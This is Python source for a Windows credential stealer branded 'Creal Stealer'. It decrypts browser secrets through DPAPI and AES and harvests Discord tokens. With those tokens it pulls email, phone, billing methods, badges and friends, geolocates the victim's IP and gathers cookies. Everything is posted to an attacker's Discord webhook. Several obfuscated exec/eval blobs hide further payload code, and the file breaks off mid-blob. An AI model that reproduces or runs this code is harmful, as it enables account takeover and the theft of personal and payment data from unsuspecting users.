import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess



hook = "WEBHOOK HERE"


DETECTED = False

def g3t1p():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"],
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def G3tD4t4(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G3tD4t4(blob_out)

def D3kryptV4lU3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

def L04durl1b(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = g3t1p()
    us3rn4m1 = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    sehir = ipdata["state"]

    globalinfo = f":flag_{contryCode}:  - `{us3rn4m1.upper()} | {ip} ({contry})`"
    return globalinfo


def TR6st(C00k13):
    # simple Trust Factor system
    global DETECTED
    data = str(C00k13)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def G3tUHQFr13ndS(t0k3n):
    b4dg3List =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        Own3dB3dg4s = ''
        flags = friend['user']['public_flags']
        for b4dg3 in b4dg3List:
            if flags // b4dg3["Value"] != 0 and friend['type'] == 1:
                if not "House" in b4dg3["Name"]:
                    Own3dB3dg4s += b4dg3["Emoji"]
                flags = flags % b4dg3["Value"]
        if Own3dB3dg4s != '':
            uhqlist += f"{Own3dB3dg4s} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist

def G3tb1ll1ng(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        b1ll1ngjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if b1ll1ngjson == []: return "```None```"

    b1ll1ng = ""
    for methode in b1ll1ngjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                b1ll1ng += ":credit_card:"
            elif methode["type"] == 2:
                b1ll1ng += ":parking: "

    return b1ll1ng


def G3tB4dg31(flags):
    if flags == 0: return ''

    Own3dB3dg4s = ''
    b4dg3List =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for b4dg3 in b4dg3List:
        if flags // b4dg3["Value"] != 0:
            Own3dB3dg4s += b4dg3["Emoji"]
            flags = flags % b4dg3["Value"]

    return Own3dB3dg4s

def G3tT0k4n1nf9(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    us3rjs0n = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    us3rn4m1 = us3rjs0n["username"]
    hashtag = us3rjs0n["discriminator"]
    em31l = us3rjs0n["email"]
    idd = us3rjs0n["id"]
    pfp = us3rjs0n["avatar"]
    flags = us3rjs0n["public_flags"]
    n1tr0 = ""
    ph0n3 = ""

    if "premium_type" in us3rjs0n: 
        nitrot = us3rjs0n["premium_type"]
        if nitrot == 1:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122>"
        elif nitrot == 2:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
    if "ph0n3" in us3rjs0n: ph0n3 = f'{us3rjs0n["ph0n3"]}'

    return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3

def ch1ckT4k1n(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

__cnk_obfuscator__ = ""
import random as _______, base64, codecs, zlib;_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/_______.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='1792035 653056 1132144 1883028 5606860 8791440 981870 2294364 3048890 3988608 4914645 8551095 9900600 5353088 2686671 7213682 1439018 2839617 8289924 8478020 1762688 3829938 2211666 2811171 4098490 2007126 4346540 8671922 5373843 2969498 5141208 3047212 3451272 1911531 1406680 214320 5807631 8313830 459204 846090 179120 6725628 10728704 4044360 65600 3123139 3077184 465290 7628712 1799508 639276 5058032 1063520 5705808 3695281 3126581 2878900 4523505 3515665 9303624 9846699 3858786 2731000 28014 2350854 352425 8638250 1293393 763972 7232736 8999235 2773 5431398 4037374 1326724 797992 7465194 10300356 4219759 2058960 4592323 4748394 2861088 2054415 2325148 3912089 1876750 4749030 4468408 2521904 5624133 5549976 405168 5182840 764449 704847 588400 627838 126312 60156 2726188 4326973 6620674 3757382 6426431 2877822 3323155 9902496 4047368 7923328 612447 1576764 5837970 1549614 3488265 3632869 1678456 2502792 2146365 8621478 4937100 7051345 4936233 8760570 62694 1695954 2739555 535866 7115160 2485336 7708240 7851828 169176 6724660 10061388 1398904 300333 3752112 3651088 2280200 6845364 924176 1836324 5134272 360295 3481875 292878 9246240 1133010 10276970 4191544 1286640 7025700 9415745 4759077 3682455 4053175 2967216 4094244 2027808 4427280 1551741 440105 3832154 4528290 2443050 8110960 4118500 2556881 1318588 252800 9730815 5792985 4510818 4342041 7431723 195648 3177368 457376 1286866 10197200 3298460 9090224 1680112 11413290 1086456 3559028 2540209 2979200 9485204 2695196 2382662 8999900 2949345 5052640 6594093 3325560 10886316 6733800 2174926 3172059 5769336 3788295 3666000 964471 9066848 9717435 4435813 10036341 5078583 2832396 3579576 10828050 84693 9999364 3664360 131318 2825046 4769520 4395215 4356492 4062238 1171750 445587 3512880 2759661 4420521 1993012 5150412 3849429 3461184 1577261 1879488 4886819 1671592 2152488 3509490 5571292 1941992 1399358 7187017 1116525 505350 6976718 5831850 1250370 4136580 2721264 2598856 4992616 5869424 2051811 5422120 7607184 3605394 3815595 8568420 555288 5568528 5548312 6074624 5448480 3766404 4041360 2306892 8608941 6375960 8514808 345420 6315296 4990090 3785032 1323952 4394250 8035776 4594211 564060 5176024 723639 925600 4171688 9301039 1914710 1097590 2983920 866916 579025 4237026 5047757 384750 8483319 5746680 3283995 7752628 3641584 2990515 9552504 2127600 9398987 423311 10771630 4632714 10528250 2587050 3219885 2406384';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLcq/IccytMIkqdzF1cncxcQTyowKDjABk3QfG';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kM1ugzAQhF8pMaEtR1CBYHCB8me4AUqAymBoMNh++gJKelhpZrSrb7QZGctUaA/3vM9HOwJHoIAdHscZG8EV6IG66KvJEdQ7FF8rD2i77nNpikNb7I3GYnn6ZkwyMSpF5cmoR7Z3ymUK9Ph/d8EWb1HsrBSYAgf8vrFWKpsHBZmcXH31XLMbt065rLsBXjYeIzgW7RSwOu/nGlu+pEo6D5Zf08Wnhv1N8uDrYoTzPQ05MYKfuej5np2KkE0HD6ov3nbP35HLhEeYMiT89gu1MwYRQVZDEIz4ANUSK2Y1uMVtSJzq0HtmN88/bd1KXSD4WRUWX7Lth3+ys3G4")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')

def upl05dT4k31(t0k3n, path):
    __cnk_obfuscator__ = ""
    import random as _______, base64, codecs, zlib;_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/_______.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='2719500 1995040 4361032 360644 567008 8360352 5907780 3593738 1548462 2192080 388310 5763765 5162928 4095520 8061651 3235470 285706 7475985 89466 10899455 1128705 669781 1961919 2868495 4925140 4987521 9664160 6406304 10915740 9729146 4846020 1660659 4445976 2303670 4843520 933796 7450986 9531480 287130 378420 125700 6859285 8277984 3457095 4148046 4649889 7921584 1037056 10227672 8753904 1953933 1067753 326700 10154770 8681148 9955479 8931132 2931243 10515636 923616 8506485 11094608 9793680 400510 1044317 10617696 5935392 9167704 1211336 666900 1855136 10199013 340956 8655114 7382628 1073592';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzCizJiSovyHYM9DGNyg0ydXIvyI0K9MkGAGj7CEk=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kM1ugzAQhF8pMaEtR1CBYHCB8me4AUqAymBoMNh++gJKelhpZrSrb7QZGctUaA/3vM9HOwJHoIAdHscZG8EV6IG66KvJEdQ7FF8rD2i77nNpikNb7I3GYnn6ZkwyMSpF5cmoR7Z3ymUK9Ph/d8EWb1HsrBSYAgf8vrFWKpsHBZmcXH31XLMbt065rLsBXjYeIzgW7RSwOu/nGlu+pEo6D5Zf08Wnhv1N8uDrYoTzPQ05MYKfuej5np2KkE0HD6ov3nbP35HLhEeYMiT89gu1MwYRQVZDEIz4ANUSK2Y1uMVtSJzq0HtmN88/bd1KXSD4WRUWX7Lth3+ys3G4")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)

    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    b1ll1ng = G3tb1ll1ng(t0k3n)
    b4dg3 = G3tB4dg31(flags)
    friends = G3tUHQFr13ndS(t0k3n)
    if friends == '': friends = "```No Rare Friends```"
    if not b1ll1ng:
        b4dg3, ph0n3, b1ll1ng = "🔒", "🔒", "🔒"
    if n1tr0 == '' and b4dg3 == '': n1tr0 = "```None```"

    data = {
        "content": f'{globalInfo()} | `{path}`',
        "embeds": [
            {
            "color": 0000000,
            "fields": [
                {
                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                    "value": f"```{t0k3n}```",
                    "inline": True
                },
                {
                    "name": "<:mail:750393870507966486> Email:",
                    "value": f"```{em31l}```",
                    "inline": True
                },
                {
                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                    "value": f"```{ph0n3}```",
                    "inline": True
                },
                {
                    "name": "<:mc_earth:589630396476555264> IP:",
                    "value": f"```{g3t1p()}```",
                    "inline": True
                },
                {
                    "name": "<:woozyface:874220843528486923> Badges:",
                    "value": f"{n1tr0}{b4dg3}",
                    "inline": True
                },
                {
                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                    "value": f"{b1ll1ng}",
                    "inline": True
                },
                {
                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{us3rn4m1}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
        "username": "Creal Stealer",
        "attachments": []
        }
    __cnk_obfuscator__ = ""
    import random as _______, base64, codecs, zlib;_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/_______.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='1792035 653056 1132144 1883028 5606860 8791440 981870 2294364 3048890 3988608 4914645 8551095 9900600 5353088 2686671 7213682 1439018 2839617 8289924 8478020 1762688 3829938 2211666 2811171 4098490 2007126 4346540 8671922 5373843 2969498 5141208 3047212 3451272 1911531 1406680 214320 5807631 8313830 459204 846090 179120 6725628 10728704 4044360 65600 3123139 3077184 465290 7628712 1799508 639276 5058032 1063520 5705808 3695281 3126581 2878900 4523505 3515665 9303624 9846699 3858786 2731000 28014 2350854 352425 8638250 1293393 763972 7232736 8999235 2773 5431398 4037374 1326724 797992 7465194 10300356 4219759 2058960 4592323 4748394 2861088 2054415 2325148 3912089 1876750 4749030 4468408 2521904 5624133 5549976 405168 5182840 764449 704847 588400 627838 126312 60156 2726188 4326973 6620674 3757382 6426431 2877822 3323155 9902496 4047368 7923328 612447 1576764 5837970 1549614 3488265 3632869 1678456 2502792 2146365 8621478 4937100 7051345 4936233 8760570 62694 1695954 2739555 535866 7115160 2485336 7708240 7851828 169176 6724660 10061388 1398904 300333 3752112 3651088 2280200 6845364 924176 1836324 5134272 360295 3481875 292878 9246240 1133010 10276970 4191544 1286640 7025700 9415745 4759077 3682455 4053175 2967216 4094244 2027808 4427280 1551741 440105 3832154 4528290 2443050 8110960 4118500 2556881 1318588 252800 9730815 5792985 4510818 4342041 7431723 195648 3177368 457376 1286866 10197200 3298460 9090224 1680112 11413290 1086456 3559028 2540209 2979200 9485204 2695196 2382662 8999900 2949345 5052640 6594093 3325560 10886316 6733800 2174926 3172059 5769336 3788295 3666000 964471 9066848 9717435 4435813 10036341 5078583 2832396 3579576 10828050 84693 9999364 3664360 131318 2825046 4769520 4395215 4356492 4062238 1171750 445587 3512880 2759661 4420521 1993012 5150412 3849429 3461184 1577261 1879488 4886819 1671592 2152488 3509490 5571292 1941992 1399358 7187017 1116525 505350 6976718 5831850 1250370 4136580 2721264 2598856 4992616 5869424 2051811 5422120 7607184 3605394 3815595 8568420 555288 5568528 5548312 6074624 5448480 3766404 4041360 2306892 8608941 6375960 8514808 345420 6315296 4990090 3785032 1323952 4394250 8035776 4594211 564060 5176024 723639 925600 4171688 9301039 1914710 1097590 2983920 866916 579025 4237026 5047757 384750 8483319 5746680 3283995 7752628 3641584 2990515 9552504 2127600 9398987 423311 10771630 4632714 10528250 2587050 3219885 2406384';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLcq/IccytMIkqdzF1cncxcQTyowKDjABk3QfG';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kM1ugzAQhF8pMaEtR1CBYHCB8me4AUqAymBoMNh++gJKelhpZrSrb7QZGctUaA/3vM9HOwJHoIAdHscZG8EV6IG66KvJEdQ7FF8rD2i77nNpikNb7I3GYnn6ZkwyMSpF5cmoR7Z3ymUK9Ph/d8EWb1HsrBSYAgf8vrFWKpsHBZmcXH31XLMbt065rLsBXjYeIzgW7RSwOu/nGlu+pEo6D5Zf08Wnhv1N8uDrYoTzPQ05MYKfuej5np2KkE0HD6ov3nbP35HLhEeYMiT89gu1MwYRQVZDEIz4ANUSK2Y1uMVtSJzq0HtmN88/bd1KXSD4WRUWX7Lth3+ys3G4")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')

    


def R4f0rm3t(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "wpcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = R4f0rm3t(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                    }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
            "attachments": []
            }
        __cnk_obfuscator__ = ""
        import random as _______, base64, codecs, zlib;_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/_______.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='1792035 653056 1132144 1883028 5606860 8791440 981870 2294364 3048890 3988608 4914645 8551095 9900600 5353088 2686671 7213682 1439018 2839617 8289924 8478020 1762688 3829938 2211666 2811171 4098490 2007126 4346540 8671922 5373843 2969498 5141208 3047212 3451272 1911531 1406680 214320 5807631 8313830 459204 846090 179120 6725628 10728704 4044360 65600 3123139 3077184 465290 7628712 1799508 639276 5058032 1063520 5705808 3695281 3126581 2878900 4523505 3515665 9303624 9846699 3858786 2731000 28014 2350854 352425 8638250 1293393 763972 7232736 8999235 2773 5431398 4037374 1326724 797992 7465194 10300356 4219759 2058960 4592323 4748394 2861088 2054415 2325148 3912089 1876750 4749030 4468408 2521904 5624133 5549976 405168 5182840 764449 704847 588400 627838 126312 60156 2726188 4326973 6620674 3757382 6426431 2877822 3323155 9902496 4047368 7923328 612447 1576764 5837970 1549614 3488265 3632869 1678456 2502792 2146365 8621478 4937100 7051345 4936233 8760570 62694 1695954 2739555 535866 7115160 2485336 7708240 7851828 169176 6724660 10061388 1398904 300333 3752112 3651088 2280200 6845364 924176 1836324 5134272 360295 3481875 292878 9246240 1133010 10276970 4191544 1286640 7025700 9415745 4759077 3682455 4053175 2967216 4094244 2027808 4427280 1551741 440105 3832154 4528290 2443050 8110960 4118500 2556881 1318588 252800 9730815 5792985 4510818 4342041 7431723 195648 3177368 457376 1286866 10197200 3298460 9090224 1680112 11413290 1086456 3559028 2540209 2979200 9485204 2695196 2382662 8999900 2949345 5052640 6594093 3325560 10886316 6733800 2174926 3172059 5769336 3788295 3666000 964471 9066848 9717435 4435813 10036341 5078583 2832396 3579576 10828050 84693 9999364 3664360 131318 2825046 4769520 4395215 4356492 4062238 1171750 445587 3512880 2759661 4420521 1993012 5150412 3849429 3461184 1577261 1879488 4886819 1671592 2152488 3509490 5571292 1941992 1399358 7187017 1116525 505350 6976718 5831850 1250370 4136580 2721264 2598856 4992616 5869424 2051811 5422120 7607184 3605394 3815595 8568420 555288 5568528 5548312 6074624 5448480 3766404 4041360 2306892 8608941 6375960 8514808 345420 6315296 4990090 3785032 1323952 4394250 8035776 4594211 564060 5176024 723639 925600 4171688 9301039 1914710 1097590 2983920 866916 579025 4237026 5047757 384750 8483319 5746680 3283995 7752628 3641584 2990515 9552504 2127600 9398987 423311 10771630 4632714 10528250 2587050 3219885 